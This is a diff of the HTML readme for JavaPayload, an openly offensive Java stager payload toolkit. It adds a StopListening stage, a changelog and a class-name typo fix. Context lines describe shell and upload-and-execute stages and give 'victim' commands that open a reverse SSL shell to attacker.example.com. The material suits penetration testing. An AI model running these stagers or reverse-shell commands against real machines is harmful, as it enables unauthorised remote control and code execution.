@@ -10,7 +10,7 @@ p {margin-left: 2em; margin-right: 2em;}
 <body>
 <h1>JavaPayload - Platform independent Java stager payloads</h1>
 
-<p><i>&copy; 2010 Michael 'mihi' Schierl, <tt>&lt;schierlm at users dot sourceforge dot net&gt;</tt></i></p>
+<p><i>&copy; 2010, 2011 Michael 'mihi' Schierl, <tt>&lt;schierlm at users dot sourceforge dot net&gt;</tt></i></p>
 
 <p><a href="JavaPayload-0.2.zip">Download JavaPayload-0.2.zip</a> (both source and compiled classes, 197 KB)</p>
 
@@ -70,7 +70,9 @@ directly over the JDWP connection. This is slower than a dedicated connection, b
 connection is not possible.</p>
 
 <p>The BindMultiTCP stager works like the BindTCP stager, but can accept more than one connection at the same time.
-This is useful if you want to test multiple payloads against the same machine.</p>
+This is useful if you want to test multiple payloads against the same machine. In case you want to make it stop 
+listening, run the StopListening payload against it. Due to a race condition (the next socket accept is started
+before the stager is finished), you will have to run it twice to make it really stop.</p>
 
 <p>The ReverseTCP stager handler can auto-bind to a port if you specify # as the port number.
 In this case, the stager handler will print the port number to stdout. When this handler is used
@@ -105,6 +107,14 @@ remote IP addresses) and JSh (try it yourself, it is awesome). All these stages 
 stderr streams automatically. Shell, SystemInfo and JSh do not need parameters, the other
 two expect a command name and optional arguments - for UpExec the command name should be an absolute file name
 on the attacker's machine, which will be uploaded to the temp directory and executed there.</p>
+
+<h2>Changes since version 0.2</h2>
+
+<ul>
+<li>JavaPayload is now hosted as a <a href="http://javapayload.sourceforge.net/">SourceForge project</a></li>
+<li>Integrated SpawnJavaPayload (formerly an independent download)</li>
+<li>Added StopListening stage for BindMultiTCP stager</li>
+</ul>
 
 <h2>Changes since version 0.1</h2>
 
@@ -202,7 +212,7 @@ the ASM libraries and/or the JDK's <tt>tools.jar</tt> have to be in the classpat
 <p><b>On the "victim" machine:</b></p>
 <p><tt>java -jar ReverseSSL_JSh.jar ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
 <p>&mdash; or &mdash;</p>
-<p><tt>java -cp JavaPayload.jar javapayload.loader.StandaloneLoder ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
+<p><tt>java -cp JavaPayload.jar javapayload.loader.StandaloneLoader ReverseSSL attacker.example.com 2010 -- JSh</tt></p>
 
 <h3>Standalone example (using custom-tailored JAR file with embedded parameters)</h3>
 
